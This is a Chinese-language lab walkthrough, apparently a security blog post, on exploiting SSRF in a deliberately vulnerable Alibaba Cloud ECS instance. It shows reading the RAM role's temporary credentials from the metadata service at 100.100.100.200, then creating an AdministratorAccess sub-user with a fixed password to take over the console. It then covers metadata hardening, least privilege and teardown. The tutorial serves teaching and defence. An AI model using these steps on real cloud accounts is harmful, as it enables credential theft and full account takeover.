---
title: 从云服务器 SSRF 漏洞到接管你的阿里云控制台
id: takeover_aliyun_console
---

## 0x00 前言

 本文将以阿里云为例，对云服务中的一些攻防手法进行演示，首先利用 Terraform 进行 ECS SSRF 漏洞环境的搭建，然后通过实例中存在的 SSRF 漏洞一步步拿下该云服务账户的所有的阿里云服务权限。

## 0x01 环境搭建

本文采用 TerraformGoat 进行靶场的搭建，Terraform 靶场地址：[https://github.com/HuoCorp/TerraformGoat](https://github.com/HuoCorp/TerraformGoat)

在部署靶场时，需要用到你的阿里云 AccessKey，为了避免影响到你的云上生产环境，因此这里强烈建议使用非生产环境的 AccessKey，不要和生产环境使用同一个账号。

接下来开始搭建靶场，首先克隆靶场项目到本地，并构建下载靶场所需的依赖。

```bash
git clone https://github.com/HuoCorp/TerraformGoat.git --depth 1
cd TerraformGoat
docker build . -t terraformgoat:v0.0.3
docker run -itd --name terraformgoat terraformgoat:v0.0.3
docker exec -it terraformgoat /bin/bash
```

如果 github 访问较慢，可以给终端挂上代理

```bash
proxy_url="127.0.0.1:1080" && export https_proxy=http://$proxy_url http_proxy=http://$proxy_url all_proxy=socks5://$proxy_url
```

在进入容器后，容器会提示选择接下来要使用的云服务提供商，这里以阿里云服务为例，输入 2 选择阿里云后回车。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-06/1654513595-194688-1654511605.png)

进入到阿里云 ECS SSRF 靶场路径下，并配置你的 AccessKey

```bash
cd /TerraformGoat/aliyun/ecs/ecs_ssrf/
aliyun configure
```

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-06/1654513607-696519-1654511641.png)


部署 SSRF 靶场

```bash
terraform init
terraform apply
```

如果 init 初始化比较慢，挂上代理即可

在 apply 期间，会提示 Enter a value，这时输入 yes 回车即可。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-06/1654513617-740818-1654511678.png)

在 Outputs 处，可以看到返回的靶场地址，访问这个地址，可以看到 SSRF 测试靶场页面，这时就说明环境搭建完了。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-06/1654513629-824184-1654511714.png)

## 0x02 环境利用

当前环境存在 SSRF 漏洞，但和常规 SSRF 所处的环境不同，这里的 SSRF 漏洞是出现在云服务器上的，这也就意味着我们可以通过这个 SSRF 漏洞获取到该服务器的元数据信息。

访问元数据

```bash
http://100.100.100.200/latest/meta-data
```

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-06/1654513640-110993-1654511862.png)

在返回的结果中，可以看到当前环境存在 ram/ 目录，这也就意味着当前云服务器配置了 RAM 角色，这样我们可以获取到临时凭证了。

通过元数据获取临时凭证

> 这里 URL 中的 huocorp-terraform-goat-role 是 RAM 角色名称，可以通过访问 http://100.100.100.200/latest/meta-data/ram/security-credentials/ 获取到。

```bash
http://100.100.100.200/latest/meta-data/ram/security-credentials/huocorp-terraform-goat-role
```
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-06/1654513649-861594-1654511960.png)

将临时凭证配置到 aliyun 命令行工具里。

```bash
aliyun configure --mode StsToken
```
![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-06/1654513660-960032-1654512150.png)

创建子用户，并赋予管理员权限

```bash
aliyun ram CreateUser --UserName teamssix
aliyun ram CreateLoginProfile --UserName teamssix --Password TeamsSix@666
aliyun ram AttachPolicyToUser --PolicyType System --PolicyName AdministratorAccess --UserName teamssix
```

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-06/1654513669-982449-1654512184.png)

访问 [https://signin.aliyun.com](https://signin.aliyun.com) 页面，通过 RAM 用户进行登录，这里的用户格式为 username@company-alias，其中 username 就是刚刚创建的用户名，company-alias 可以通过下面的这个命令获取到。

```bash
aliyun ram GetAccountAlias
```

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-06/1654513679-980924-1654512236.png)

这里的 AccountAlias 就是我们需要的 company-alias，接下来就可以登录控制台了。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-06/1654513692-466746-1654512350.png)

输入刚才创建用户时的密码

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-06/1654513699-904105-1654512375.png)

登录后，就可以看到目标的控制台了。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-06/1654513709-515845-1654512406.png)

由于刚才在创建用户时，赋予了 AdministratorAccess 权限，因此在 RAM 访问控制处可以看到，当前账号拥有管理所有阿里云资源的权限。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-06/1654513715-622060-1654512448.png)

在云服务 ECS 实例中也可以看到我们刚才搭建的那台 SSRF 靶场服务器。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-06/1654513721-858863-1654512539.png)

至此，就实现了利用云服务器上的 SSRF 漏洞接管了阿里云控制台。

> 另外这个环境里还放了一个 flag 文件，你如果感兴趣的话，可以动手去尝试找到这个 flag，Writeup 地址：[https://github.com/HuoCorp/TerraformGoat/tree/main/aliyun/ecs/ecs_ssrf](https://github.com/HuoCorp/TerraformGoat/tree/main/aliyun/ecs/ecs_ssrf)

## 0x03 防御措施

这个环境的问题除了存在 SSRF 外，还有另外两个主要的问题：

1. RAM 角色权限过大，导致可以通过该角色的权限进行创建子用户以及给子用户授予高权限等操作
2. 元数据未做加固访问，导致一旦目标存在 SSRF 漏洞，元数据就存在被获取的风险



那么针对第一个 RAM 角色权限过大的问题，主要还是需要使用者严格遵守权限最小化的原则，在为 RAM 角色赋予权限时，避免赋予过高的权限，只赋予自己所需要的权限，这样可以将影响程度降到最低，但是这并不能治本。



针对第二个元数据未做加固访问的问题，可以将实例上的元数据访问模式设置为加固模式，这是一种治本的方法，将元数据访问模式设置为加固模式有以下两种方法：

1. 在创建实例时，可以在「系统配置」的「高级选项」中将「实例元数据访问模式」设置为「仅加固模式」

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-07/1654569264-55792-1654569052.png)

2. 在已经创建好的实例中，可以在阿里云 OpenAPI 中开启元数据强制使用 Token 访问，OpenAPI 地址：[https://next.api.aliyun.com/api/Ecs/2014-05-26/ModifyInstanceMetadataOptions](https://next.api.aliyun.com/api/Ecs/2014-05-26/ModifyInstanceMetadataOptions)

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-07/1654569271-412956-1654569124.png)

将 HttpTokens 设置为 required 即表示强制使用加固模式，此时再访问元数据就会提示 403 了。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-07/1654569282-193498-1654569149.png)

值得一提的是，将元数据设置为加固模式可以防止通过 SSRF 获取到元数据，但如果实例权限被拿下，那么红队还是可以通过在实例上执行获取 token 的命令，然后利用该 token 获取到元数据。

在 Linux 实例中获取 token 的命令如下：

```bash
TOKEN=`curl -X PUT "http://100.100.100.200/latest/api/token" -H "X-aliyun-ecs-metadata-token-ttl-seconds: 21600"`
```

通过 token 获取元数据

```bash
curl -H "X-aliyun-ecs-metadata-token: $TOKEN"  http://100.100.100.200/latest/meta-data/
```

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-07/1654570333-826113-1654569172.png)

对于 Windows 实例下的获取方法可以参考阿里云官方文档：[https://help.aliyun.com/document_detail/108460.htm](https://help.aliyun.com/document_detail/108460.htm)

> 将元数据访问模式设置为加固模式进而防御 SSRF 漏洞的这个方法由 2h0ng 师傅提供

## 0x04 环境删除

删除创建的子账号

```bash
aliyun ram DetachPolicyFromUser --PolicyType System --PolicyName AdministratorAccess --UserName teamssix
aliyun ram DeleteUser --UserName teamssix
```

删除 SSRF 靶场环境，在使用完靶场后，记得及时删除，因为这里创建的云服务是按时间计费的，该靶场实例的价格为每小时 0.17 元人民币。

> 在销毁靶场之前，记得把 AccessKey 配置成最开始的 AccessKey，配置命令：aliyun configure --mode AK

```bash
terraform destroy
```

如果想清除 TerraformGoat，可以使用以下命令，如果以后还想进行云上攻防的学习，则可以将 TerraformGoat 环境保留下来。

```bash
docker stop terraformgoat
docker rm terraformgoat
docker rmi terraformgoat:v0.0.3
```

## 0x05 总结

这里通过云上 SSRF 漏洞获取到了临时密钥，通过临时秘钥创建了一个具有管理员访问权限的子用户，最后通过这个子用户接管了目标的控制台。

但是这个方法在实战中想要使用是有一些前提的，主要前提有以下两个：

1. ECS 实例需要被授予 RAM 角色，不然访问临时凭证的元数据会返回 404
2. RAM 角色需要具备 ram 访问控制的相关操作权限，例如创建用户、赋予权限等，不然临时秘钥会没有创建子用户的权限。

> 在实战中，如果遇到了 ECS 实例被授予了 RAM 角色的情况，大多时候该角色都是不具备创建用户权限的，这时就没法通过创建子账号登录控制台的方式了，只能通过阿里云命令行工具去操作目标云服务了。

总的来说，云上攻防和常规的内网攻防还是十分不一样的。

- 云上攻防的常见问题是配置错误，例如这里的问题就是 RAM 角色配置权限过高。
- 云上攻防的权限维持主要方法是创建 RAM 高权限用户，而不是像传统攻防里那样有五花八门的权限维持方法。
- 云上攻防的内网横向主要是在云服务厂商命令行或者控制台中进行横向，从这个云服务横向到另一个云服务，而不是像传统攻防那样有各种各样的内网横向手法。
- ……



最后，本文中所提到的很多命令都是参考火线云安全知识库中的内容，知识库地址：[https://cloudsec.huoxian.cn](https://cloudsec.huoxian.cn/)，在知识库的首页中可以看到火线云服务攻防矩阵，本文就是依据这个攻防矩阵进行的云上攻防。

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-06/1654513738-42620-1654512638.png)

如果你还想找到更多云安全资源进行学习，可以访问 Awesome Cloud Security 项目，该项目当前已经收录了上百余条国内外云安全博客、工具、公众号等资源，项目地址：[https://github.com/teamssix/awesome-cloud-security](https://github.com/teamssix/awesome-cloud-security)

![](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-06-06/1654513748-425711-1654512658.png)

> 参考文章：[https://cloudsec.huoxian.cn/docs/articles/aliyun/aliyun_ecs](https://cloudsec.huoxian.cn/docs/articles/aliyun/aliyun_ecs)